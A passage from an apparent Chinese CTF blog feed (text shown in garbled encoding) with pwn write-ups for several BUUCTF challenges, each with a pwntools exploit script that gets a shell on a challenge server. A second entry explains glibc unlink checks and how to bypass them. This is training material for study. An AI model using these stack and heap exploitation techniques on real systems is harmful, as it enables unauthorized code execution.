class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+<span class="hljs-string">&#x27;\x93&#x27;</span>)<br>add(<span class="hljs-number">0x88</span>)<span class="hljs-comment">#1</span><br>show(<span class="hljs-number">1</span>)<br>libc_base=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3c4b78</span><br>mlh=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>rlh=libc_base+libc.sym[<span class="hljs-string">&#x27;&#x27;</span>]<br>realloc=libc_base+libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>ogg=libc_base+<span class="hljs-number">0x4526a</span><br>log.success(<span class="hljs-string">&quot;libc base==&gt;0x%x&quot;</span> %libc_base)<br>log.success(<span class="hljs-string">&quot;__malloc_hook==&gt;0x%x&quot;</span> %mlh)<br>log.success(<span class="hljs-string">&quot;realloc==&gt;0x%x&quot;</span> %realloc)<br>log.success(<span class="hljs-string">&quot;one_gadget==&gt;0x%x&quot;</span> %ogg)<br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x88</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;\xe1&#x27;</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0xd8</span>)<span class="hljs-comment">#2</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(mlh-<span class="hljs-number">0x30</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload)-<span class="hljs-number">10</span>,payload)<br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#5</span><br>payload=p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)+p64(ogg)+p64(realloc)<br>edit(<span class="hljs-number">5</span>,<span class="hljs-built_in">len</span>(payload)-<span class="hljs-number">10</span>,payload)<br><br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x10</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="wustctf2020-getshell-2"><a href="#wustctf2020-getshell-2" class="headerlink" title="wustctf2020_getshell_2"></a>wustctf2020_getshell_2</h3><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808202602382.png" alt="image-20210808202602382"></p><p>å…ˆchecksecä¸€ä¸‹ï¼Œ32ä½ï¼Œå¼€å¯ä¿æŠ¤åªæœ‰nx</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808203034653.png" alt="image-20210808203034653"></p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808205220758.png" alt="image-20210808205220758"></p><p>idaé‡Œé¢ååˆ†ç®€å•ï¼Œæ¼æ´ç‚¹å°±è¿™ä¹ˆä¸€äº›ä¸œè¥¿ï¼Œè¯´æ˜å°±æ˜¯ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œè€Œæº¢å‡ºç®—ä¸Šè¿”å›åœ°å€ï¼Œåªæœ‰å…«ä¸ªå­—èŠ‚ï¼Œç»™çš„åé—¨å‡½æ•°æ˜¯æ— æ³•ä½¿ç”¨çš„ï¼Œé‚£ä¹ˆå¦‚æœæŒ‰ç…§åŸæ¥çš„æ„é€ æ–¹æ³•ï¼Œå­—èŠ‚æ•°æ˜¯ä¸å¤Ÿçš„ï¼Œå› ä¸ºåŠ ä¸Šè¿”å›åœ°å€ï¼Œé‚£æ˜æ˜¾æ˜¯è¦åäºŒä¸ªå­—èŠ‚ã€‚ç„¶åè¿™è¾¹çš„å­—ç¬¦è¦å»æ‰¾shï¼Œåªæœ‰shä¹Ÿæ˜¯å¯ä»¥getshellçš„ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œé‚£å¦‚æœè¦ä¸éœ€è¦è¿”å›åœ°å€ï¼Œé‚£å°±è¦å»è·³è½¬åˆ°è¿™è¾¹çš„ç¨‹åºé‡Œé¢å·²ç»æœ‰çš„call _systemï¼Œå°±å¯ä»¥ä¸éœ€è¦è¿”å›åœ°å€ï¼Œå› ä¸ºcallæŒ‡ä»¤ä¼šè‡ªåŠ¨çš„å°†ä¸‹ä¸€æ¡æŒ‡ä»¤å‹å…¥æ ˆä¸­ä½œä¸ºè¿”å›åœ°å€</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808205011413.png" alt="image-20210808205011413"></p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27986</span>)<br>sys = <span class="hljs-number">0x8048529</span><br>sh = <span class="hljs-number">0x08048670</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x1c</span> + p32(sys) + p32(sh)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="qctf-2018-stack2"><a href="#qctf-2018-stack2" class="headerlink" title="qctf_2018_stack2"></a>qctf_2018_stack2</h3><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808210516960.png" alt="image-20210808210516960"></p><p>checksecä¸€ä¸‹ï¼Œ32ä½ï¼Œä¸”æœ‰nxä»¥åŠcanaryï¼Œé‚£å°±è¦å…ˆå»å¯»æ‰¾æ€ä¹ˆæ³„éœ²canaryäº†ï¼Œä¸ç„¶æ˜¯æ²¡æ³•åšçš„</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808214029860.png" alt="image-20210808214029860"></p><p>åˆ†æäº†ä¸€ä¸‹ç¨‹åºçš„åŠŸèƒ½ï¼Œä¸å­˜åœ¨æº¢å‡ºç‚¹ï¼Œè¾“å…¥å‡½æ•°ä¹Ÿéƒ½æ˜¯ç”¨çš„scanfï¼Œåªæœ‰è¿™ä¸ªåœ°æ–¹åº”è¯¥æ˜¯æœ‰é—®é¢˜çš„ï¼Œé¦–å…ˆè¿™ä¸ªæ•°ç»„çš„æ˜¯åœ¨æ ˆä¸Šçš„ï¼Œè€Œæ•°ç»„ä¸‹æ ‡æˆ‘ä»¬æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œé‚£å°±å­˜åœ¨äº†æ•°ç»„è¶Šç•Œé—®é¢˜äº†ã€‚å¹¶ä¸”ç»™äº†ä¸€ä¸ªåé—¨å‡½æ•°ï¼Œé‚£å°±å¯ä»¥é€ä¸ªå­—èŠ‚çš„è¾“å…¥è¿›å»ï¼Œè¦†ç›–è¿”å›åœ°å€ï¼Œè¿™æ ·ä¹Ÿå°±ä¸éœ€è¦å»æ³„éœ²canaryäº†</p><p>ç„¶åå°±æ˜¯æ•°ç»„çš„åç§»ï¼Œç›´æ¥çœ‹idaçš„åæ±‡ç¼–æ˜¯é”™è¯¯çš„ï¼Œä¸ºä»€ä¹ˆä¼šé”™ï¼Ÿ</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808222850151.png" alt="image-20210808222850151"></p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808222112204.png" alt="image-20210808222112204"></p><p>æ±‡ç¼–ä»£ç å¯ä»¥è§£æƒ‘ï¼šç”±äºè¿™è¾¹çš„å¤„ç†ä¸åŒï¼Œå¯¼è‡´ebpçš„ä¸‹æ–¹å¹¶ä¸æ˜¯è¿”å›åœ°å€ï¼Œè€Œæ˜¯è¿˜æœ‰ä¸€æ®µè·ç¦»ï¼Œå°±è¦å»è°ƒè¯•è·å¾—äº†</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808225803029.png" alt="image-20210808225803029"></p><p>æˆ‘é€‰æ‹©åœ¨ä¸‹æ ‡ä¸º1çš„ä½ç½®è¾“å…¥è°ƒè¯•ï¼Œè€Œè¿™è¾¹[ebp+eax*1-0x70]å°±æ˜¯è¾“å…¥çš„æ•°æœ€ç»ˆä¼šå­˜æ”¾çš„åœ°æ–¹ï¼Œå› ä¸ºæˆ‘è¾“çš„æ˜¯0ï¼Œæ‰€ä»¥å¯ä»¥ç®—å‡ºçš„ebp-0x70å°±æ˜¯æ•°ç»„çš„èµ·å§‹åœ°å€ï¼Œè¿™æ ·åªè¦å†å»ç®—ä¸€ä¸‹è¿”å›åœ°å€åˆ°è¿™çš„åç§»å³å¯</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808230055266.png" alt="image-20210808230055266"></p><p>ç®—å‡ºåç§»ä¹‹åå°±æ˜¯åˆ©ç”¨æ•°ç»„è¶Šç•ŒæŠŠåé—¨å‡½æ•°åœ°å€å†™å…¥åˆ°è¿”å›åœ°å€</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808221957029.png" alt="image-20210808221957029"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25028</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p.recvuntil(<span class="hljs-string">&quot;have:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;0&#x27;</span>)<br>get_shell = [<span class="hljs-number">0x9b</span>,<span class="hljs-number">0x85</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x08</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>p.sendlineafter(<span class="hljs-string">&quot;5. exit&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;change&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x84</span>+i))<br>p.sendlineafter(<span class="hljs-string">&quot;number:&quot;</span>,<span class="hljs-built_in">str</span>(get_shell[i]))<br>p.sendlineafter(<span class="hljs-string">&quot;5. exit&quot;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ZJCTF-2019-Login"><a href="#ZJCTF-2019-Login" class="headerlink" title="[ZJCTF 2019]Login"></a>[ZJCTF 2019]Login</h3><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812160620361.png" alt="image-20210812160620361"></p><p>å…ˆchecksecä¸€ä¸‹ï¼Œ64ä½ï¼Œå¼€å¯äº†nxå’Œcanaryï¼Œå¯èƒ½è¦æ³„éœ²canaryï¼Œè¿›å…¥idaåˆ†æä¸€ä¸‹</p><p>è¿›å…¥ç¨‹åºï¼Œæ˜¯ä¸ªç”¨c++ç¼–å†™çš„ç¨‹åºï¼Œçœ‹èµ·æ¥æœ‰äº›è´¹åŠ›</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812162011685.png" alt="image-20210812162011685"></p><p>é¦–å…ˆæ‰¾åˆ°äº†ä¸€ä¸ªåé—¨å‡½æ•°ï¼Œé‚£ä¹ˆå°±å†å»æ‰¾æ‰¾è¾“å…¥ç‚¹ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰æº¢å‡ºï¼Œä»¥åŠæ‰¾æ‰¾æœ‰æ²¡æœ‰å‡½æ•°è°ƒç”¨çš„åœ°æ–¹ã€‚ç„¶åå¯ä»¥å‘ç°ï¼Œè¾“å…¥ç‚¹æ˜¯ä¸å­˜åœ¨æº¢å‡ºåˆ°è¿”å›åœ°å€çš„ï¼Œä½†æ˜¯å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªèƒ½è¿›è¡Œå‡½æ•°è°ƒç”¨çš„åœ°æ–¹</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812162329071.png" alt="image-20210812162329071"></p><p>åœ¨æ•´ä¸ªç¨‹åºçš„æœ€åï¼Œè¿›è¡Œå¯†ç éªŒè¯ï¼Œå¦‚æœé€šè¿‡å°±ä¼šè¿›è¡Œå‡½æ•°è°ƒç”¨ã€‚é‚£ä¹ˆï¼Œå°±å»æ‰¾æ‰¾è¿™ä¸ªå‡½æ•°è°ƒç”¨ä»å“ªé‡Œä¼ å…¥ï¼Œæ˜¯å¦å¯ä»¥ä¿®æ”¹ï¼Ÿä»¥åŠæ€ä¹ˆé€šè¿‡æ£€éªŒ</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812165314541.png" alt="image-20210812165314541"></p><p>é¦–å…ˆé€šè¿‡éªŒè¯ï¼ŒæŠŠè¿™çš„è´¦å·å¯†ç è¾“å…¥è¿›å»å³å¯</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812165836228.png" alt="image-20210812165836228"></p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812165850893.png" alt="image-20210812165850893"></p><p>ç„¶åå°±æ˜¯è¦è¿›è¡Œè¦†ç›–ï¼ŒæŠŠv8è¦†ç›–ä¸ºåé—¨å‡½æ•°ï¼Œv8åˆæ¥è‡ªvulnï¼Œè€Œvulnä¼¼ä¹ä¸æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å˜é‡ã€‚ä½†æ˜¯å»æŸ¥æ±‡ç¼–ä»£ç ï¼Œå¯ä»¥çŸ¥é“æœ€åçš„å‡½æ•°è°ƒç”¨ï¼Œè¡¨ç°æ˜¯call raxï¼Œé‚£æ˜¯å¦å¯ä»¥å»ä¿®æ”¹raxçš„æ•°æ®å‘¢ï¼Ÿ</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812170456157.png" alt="image-20210812170456157"></p><p>è¿™é‡Œå¾ˆæœ‰æ„æ€ï¼Œåœ¨call raxå‰å¯ä»¥è¿½æº¯åˆ°raxçš„å€¼æ¥è‡ªæ ˆä¸Šä¸€ä¸ªæ•°æ®ï¼Œå¯ä»¥å»çœ‹çœ‹èƒ½ä¸èƒ½è¦†ç›–</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812172747784.png" alt="image-20210812172747784"></p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812172859005.png" alt="image-20210812172859005"></p><p>è¿™é‡Œä¼ å…¥çš„raxçš„å€¼å°±æ˜¯æºå¤´ï¼Œè€Œè¿™é‡Œçš„å€¼æ˜¯æ ˆä¸Šçš„ï¼Œå¹¶ä¸”æˆ‘ä»¬æ˜¯å¯ä»¥è¦†ç›–çš„ï¼Œå°±æ˜¯åœ¨ç¬¬äºŒä¸ªè¾“å…¥ç‚¹è¾“å…¥å¯†ç çš„åœ°æ–¹</p><p>æˆåŠŸgetshell</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812164617984.png" alt="image-20210812164617984"></p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29528</span>)<br>shell = <span class="hljs-number">0x400E88</span><br><br>p.recvuntil(<span class="hljs-string">&quot;username:&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;admin&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;password:&quot;</span>)<br>payload = <span class="hljs-string">&quot;2jctf_pa5sw0rd&quot;</span>.ljust(<span class="hljs-number">0x48</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(shell)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="mrctf2020-easyrop"><a href="#mrctf2020-easyrop" class="headerlink" title="mrctf2020_easyrop"></a>mrctf2020_easyrop</h3><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812175441484.png" alt="image-20210812175441484"></p><p>checksecï¼Œ64ä½ï¼Œåªå¼€å¯nx</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812180035772.png" alt="image-20210812180035772"></p><p>é¦–å…ˆç¨‹åºå­˜åœ¨åé—¨ï¼Œä½†æ˜¯ä¾ç…§é€»è¾‘æ˜¯ä¸å¯èƒ½è¿è¡Œåˆ°åé—¨çš„ï¼Œæ‰€ä»¥éœ€è¦åŠ«æŒripæ‰§è¡Œåé—¨å‡½æ•°</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812181120347.png" alt="image-20210812181120347"></p><p>æ‰€æœ‰çš„è¾“å…¥ç‚¹éƒ½æ˜¯ä»var_310å¼€å§‹è¾“å…¥çš„ï¼Œç„¶è€Œæœ€å¤§çš„è¾“å…¥é•¿åº¦ä¹Ÿä¸è¿‡æ˜¯0x300ï¼Œä¸å¤Ÿè¦†ç›–åˆ°è¿”å›åœ°å€</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812181040014.png" alt="image-20210812181040014"></p><p>ä»”ç»†åˆ†æç¨‹åºï¼Œå¯ä»¥å‘ç°è¿™è¾¹æœ‰ä¸ªæ•°ç»„è¶Šç•Œï¼Œè¿™é‡Œçš„a1æ˜¯var_310ï¼Œæ‰€ä»¥å¯ä»¥å…ˆç”¨åˆ«çš„å‡½æ•°è¾“å…¥æ•°æ®ï¼Œç„¶åè¶Šç•Œè¦†ç›–è¿”å›åœ°å€ä¸ºåé—¨å‡½æ•°</p><p>è¿™è¾¹æœ‰ä¸ªæ³¨æ„ç‚¹ï¼šè¦†ç›–æˆåŠŸåé€€å‡ºç¨‹åºæ—¶ï¼Œç¨‹åºè¿˜æ˜¯ä¼šæ‰§è¡Œåˆ°æ•°ç»„è¶Šç•Œçš„å‡½æ•°ï¼Œæ‰€ä»¥è¿™æ—¶å€™çš„è¾“å…¥åªèƒ½æ˜¯è¾“å…¥ä¸€ä¸ªâ€™\x00â€™ï¼Œå¹¶ä¸”ä¸èƒ½å«æœ‰æ¢è¡Œç¬¦ï¼Œå¦åˆ™ä¼šæ¥åœ¨å‰é¢è¾“å…¥çš„åé—¨å‡½æ•°çš„åœ°å€ä¸Šï¼Œå¯¼è‡´åœ°å€æ— æ•ˆäº†</p><p>åœ¨æœ¬åœ°æˆåŠŸgetshellï¼Œè¿œç¨‹çš„dockerå¯èƒ½å‡ºé—®é¢˜äº†ï¼Œæ²¡æœ‰ååº”</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812184240747.png" alt="image-20210812184240747"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,26109)</span><br>p = process(<span class="hljs-string">&quot;./mrctf2020_easyrop&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>shell = <span class="hljs-number">0x40072A</span><br><br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x2ff</span> + <span class="hljs-string">&#x27;\x00&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;hehehehehehehe\n&quot;</span>,payload)<br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x19</span> + p64(shell)<br>p.sendlineafter(<span class="hljs-string">&quot;bybybybybybyby\n&quot;</span>,payload)<br>p.sendline(<span class="hljs-string">&#x27;7&#x27;</span>)<br>p.send(<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;bjdctf-2020-router&quot;&gt;&lt;a href=&quot;#bjdctf-2020-router&quot; class=&quot;headerlink&quot; title=&quot;bjdctf_2020_router&quot;&gt;&lt;/a&gt;bjdctf_2020_router&lt;/h3&gt;&lt;p&gt;å¸¸è§„chec</summary>
      
    
    
    
    
    <category term="buu" scheme="http://example.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>ä¸å®‰å…¨çš„unlink</title>
    <link href="http://example.com/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/"/>
    <id>http://example.com/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/</id>
    <published>2021-05-30T01:54:04.000Z</published>
    <updated>2021-10-13T08:01:20.310Z</updated>
    
    <content type="html"><![CDATA[<p>ä»¥ä¸‹çŸ¥è¯†æ‘˜è‡ªã€ŠCTFç«èµ›æƒå¨æŒ‡å— Pwnç¯‡ã€‹ã€CTF-Wiki</p><h1 id="ä¸å®‰å…¨çš„unlike"><a href="#ä¸å®‰å…¨çš„unlike" class="headerlink" title="ä¸å®‰å…¨çš„unlike"></a>ä¸å®‰å…¨çš„unlike</h1><h2 id="ä»€ä¹ˆå«unlike"><a href="#ä»€ä¹ˆå«unlike" class="headerlink" title="ä»€ä¹ˆå«unlike"></a>ä»€ä¹ˆå«unlike</h2><p>ä¸ºäº†é¿å…å †å†…å­˜çš„è¿‡åº¦ç¢ç‰‡åŒ–ï¼Œå½“ä¸€ä¸ªå †å—ï¼ˆéfastbin chunkï¼‰è¢«é‡Šæ”¾æ—¶ï¼Œlibcä¼šæŸ¥çœ‹å…¶å‰åå †å—æ˜¯å¦å¤„äºè¢«é‡Šæ”¾çš„çŠ¶æ€ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™å°†å‰é¢æˆ–åé¢çš„å †å—ä»binsé“¾å–å‡ºæ¥ï¼Œä¸å½“å‰é‡Šæ”¾å †å—åˆå¹¶ï¼Œè¿™ä¸ªå–å‡ºå †å—çš„è¿‡ç¨‹å°±å«åšunlike</p><p>åŸºæœ¬è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/unlink_smallbin_intro.png"></p><p>ä¸Šè¿°çš„æ“ä½œè¿›è¡Œäº†å¦‚ä¸‹çš„èµ‹å€¼</p><ul><li><p>*( fd + 0x18 ) = bk</p></li><li><p>*( bk + 0x10 ) = fd</p></li></ul><h3 id="unlinkä¸­çš„æ£€æŸ¥"><a href="#unlinkä¸­çš„æ£€æŸ¥" class="headerlink" title="unlinkä¸­çš„æ£€æŸ¥"></a>unlinkä¸­çš„æ£€æŸ¥</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ç”±äº P å·²ç»åœ¨åŒå‘é“¾è¡¨ä¸­ï¼Œæ‰€ä»¥æœ‰ä¸¤ä¸ªåœ°æ–¹è®°å½•å…¶å¤§å°ï¼Œæ‰€ä»¥æ£€æŸ¥ä¸€ä¸‹å…¶å¤§å°æ˜¯å¦ä¸€è‡´(sizeæ£€æŸ¥)</span><br><span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))      \<br>      malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);               \<br>      <br><span class="hljs-comment">// æ£€æŸ¥ fd å’Œ bk æŒ‡é’ˆ(åŒå‘é“¾è¡¨å®Œæ•´æ€§æ£€æŸ¥)</span><br><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))                      \<br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \<br><br>  <span class="hljs-comment">// largebin ä¸­ next_size åŒå‘é“¾è¡¨å®Œæ•´æ€§æ£€æŸ¥ </span><br>              <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)              \<br>                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))    \<br>              malloc_printerr (check_action,                                      \<br>                               <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,P, AV);  \<br></code></pre></td></tr></table></figure><h2 id="åˆ©ç”¨unlink"><a href="#åˆ©ç”¨unlink" class="headerlink" title="åˆ©ç”¨unlink"></a>åˆ©ç”¨unlink</h2><p>è¦åˆ©ç”¨unlinké¦–å…ˆè¦ç»•è¿‡ä¸Šé¢æåˆ°çš„ä¸¤ä¸ªæ£€æŸ¥ï¼š</p><ol><li><p>sizeæ£€æŸ¥ï¼š</p><p>åœ¨å †ä¸­æœ‰ä¸¤ä¸ªåœ°æ–¹å­˜å‚¨äº†Pçš„sizeï¼šç¬¬ä¸€ä¸ªæ˜¯å½“å‰P-&gt;sizeï¼Œç¬¬äºŒä¸ªæ˜¯next_chunk-&gt;prev_sizeï¼Œæ¯”è¾ƒä¸¤è€…å¤§å°</p></li><li><p>fdå’Œbkæ£€æŸ¥ï¼š</p><p>æ£€æŸ¥Pæ˜¯å¦åœ¨åŒå‘é“¾è¡¨ä¸­ï¼Œåœ¨åŒå‘é“¾è¡¨ä¸­æœ‰ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘Pï¼šç¬¬ä¸€ä¸ªæ˜¯FD-&gt;bkï¼Œç¬¬äºŒä¸ªæ˜¯BK-&gt;fd</p></li></ol><p>åœ¨libc-2.27.soç‰ˆæœ¬ï¼Œè¦å…ˆå¡«æ»¡tcache bin</p><h3 id="ç¬¬ä¸€ç§æ€è·¯"><a href="#ç¬¬ä¸€ç§æ€è·¯" class="headerlink" title="ç¬¬ä¸€ç§æ€è·¯"></a>ç¬¬ä¸€ç§æ€è·¯</h3><h4 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4><ol><li>å­˜åœ¨UAFå¯ä»¥ä¿®æ”¹Pçš„fdå’Œbk</li><li>å­˜åœ¨ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘P</li></ol><h4 id="åˆ©ç”¨æ–¹æ³•"><a href="#åˆ©ç”¨æ–¹æ³•" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h4><ol><li>é€šè¿‡UAFæ¼æ´ä¿®æ”¹chunk0-&gt;fd=G_ptr-0x18ï¼Œchunk0-&gt;bk=G_ptr-0x10ï¼Œç»•è¿‡fdå’Œbkæ£€æŸ¥</li><li>freeä¸‹ä¸€ä¸ªchunkï¼Œchunk0å’Œchunk1åˆå¹¶ï¼Œchunk0å‘ç”Ÿunlinkï¼Œä¿®æ”¹äº†G_ptrçš„å€¼</li></ol><h4 id="æ•ˆæœ"><a href="#æ•ˆæœ" class="headerlink" title="æ•ˆæœ"></a>æ•ˆæœ</h4><p>ä¿®æ”¹G_ptr=&amp;G_ptr-0x18ã€‚å¦‚æœèƒ½å¤Ÿå¯¹G_ptræŒ‡å‘çš„ç©ºé—´è¿›è¡Œä¿®æ”¹ï¼Œåˆ™å¯èƒ½å¯¼è‡´ä»»æ„åœ°å€è¯»å†™ã€‚</p><p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/20201112000118623.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="ç¬¬äºŒç§æ€è·¯"><a href="#ç¬¬äºŒç§æ€è·¯" class="headerlink" title="ç¬¬äºŒç§æ€è·¯"></a>ç¬¬äºŒç§æ€è·¯</h3><h4 id="åˆ©ç”¨æ¡ä»¶-1"><a href="#åˆ©ç”¨æ¡ä»¶-1" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4><ol><li>å¯ä»¥ä¿®æ”¹pçš„ä¸‹ä¸€ä¸ªchunk-&gt;pre_sizeå’Œinuseä½</li><li>å­˜åœ¨ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘chunk pçš„å†…å®¹éƒ¨åˆ†</li></ol><h4 